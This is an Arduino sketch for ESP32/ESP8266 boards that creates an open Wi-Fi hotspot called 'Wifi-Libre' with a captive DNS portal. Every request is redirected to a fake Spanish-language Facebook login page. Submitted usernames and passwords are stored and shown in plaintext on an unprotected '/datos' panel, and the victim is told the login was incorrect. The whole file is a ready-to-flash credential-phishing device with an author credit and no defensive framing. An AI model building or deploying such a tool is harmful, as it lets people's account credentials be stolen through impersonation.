#ifdef ESP32
#include <WiFi.h>
#include <WebServer.h>
#else
#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#endif
#include <DNSServer.h>

String ssid = "Wifi-Libre";

const byte DNS_PORT = 53;
DNSServer dnsServer;
#ifdef ESP32
WebServer server(80);
#else
ESP8266WebServer server(80);
#endif

String username = "";
String userpassword = "";

void handleRoot() {
  String html = "<!DOCTYPE html><html><head><title>Facebook - Inicia sesion o registrate</title><meta name='viewport' content='width=device-width, initial-scale=1'><style>body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background-color: #eceff5; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }.login-container { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1); width: 90%; max-width: 400px; text-align: center; }.login-container h2 { color: #1877f2; font-size: 24px; margin-bottom: 20px; }.login-container input[type='text'], .login-container input[type='password'] { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; }.login-container input[type='submit'] { width: 100%; padding: 14px; margin-top: 10px; background-color: #1877f2; color: #fff; border: none; border-radius: 6px; cursor: pointer; font-size: 16px; }.login-container input[type='submit']:hover { background-color: #155db2; }</style></head><body><div class='login-container'><h2>Inicia sesion en Facebook</h2><form action='/login' method='post'><input type='text' name='username' placeholder='Correo electronico o telefono'><br><input type='password' name='password' placeholder='Contraseña'><br><input type='submit' value='Iniciar sesion'></form></div></body></html>";
  server.send(200, "text/html", html);
}

void handleLogin() {
  if (server.method() == HTTP_POST) {
    username = server.arg("username");
    userpassword = server.arg("password");
    server.send(200, "text/html", "<h1>Incorrecto</h1>");
  } else {
    server.send(405, "text/plain", "Method Not Allowed");
  }
}

void handleData() {
  String response = "<!DOCTYPE html><html lang='es'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title>Panel de control</title><style>body { font-family: Arial, sans-serif; background-color: #f4f4f4; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; } .container { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); max-width: 400px; width: 100%; text-align: center; } h1, h2 { color: #333; } p { color: #555; } input[type='text'] { width: calc(100% - 20px); padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; } input[type='submit'] { width: 100%; padding: 10px; background-color: #007bff; color: #fff; border: none; border-radius: 4px; cursor: pointer; } input[type='submit']:hover { background-color: #0056b3; } </style></head><body><div class='container'><h1>Panel de control</h1><p>Username: " + username + "</p><p>Password: " + userpassword + "</p><h2>Cambiar SSID</h2><form action='/change_ssid' method='post'><input type='text' name='new_ssid' placeholder='Nueva SSID'><br><input type='submit' value='Cambiar SSID'></form><p>Script 100% full hecho por Dylan .i.</p></div></body></html>";
  server.send(200, "text/html", response);
}

void handleChangeSSID() {
  if (server.method() == HTTP_POST) {
    String new_ssid = server.arg("new_ssid");
    if (new_ssid.length() > 0) {
      ssid = new_ssid;
      WiFi.softAP(ssid.c_str()); 
      server.send(200, "text/html", "<h1>SSID cambiada a " + ssid + "</h1>");
    } else {
      server.send(400, "text/html", "<h1>Error: SSID no puede estar vacía</h1>");
    }
  } else {
    server.send(405, "text/plain", "Method Not Allowed");
  }
}

void handleNotFound() {
  server.sendHeader("Location", String("http://") + WiFi.softAPIP().toString(), true);
  server.send(302, "text/plain", "");
}

void setup() {
  Serial.begin(115200);

  WiFi.softAP(ssid.c_str());
  IPAddress myIP = WiFi.softAPIP();
  Serial.print("AP IP address: ");
  Serial.println(myIP);

  dnsServer.start(DNS_PORT, "*", myIP);

  server.on("/", handleRoot);
  server.on("/login", HTTP_POST, handleLogin);
  server.on("/datos", handleData);
  server.on("/change_ssid", HTTP_POST, handleChangeSSID);
  server.onNotFound(handleNotFound);

  server.begin();
  Serial.println("HTTP server started");
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}
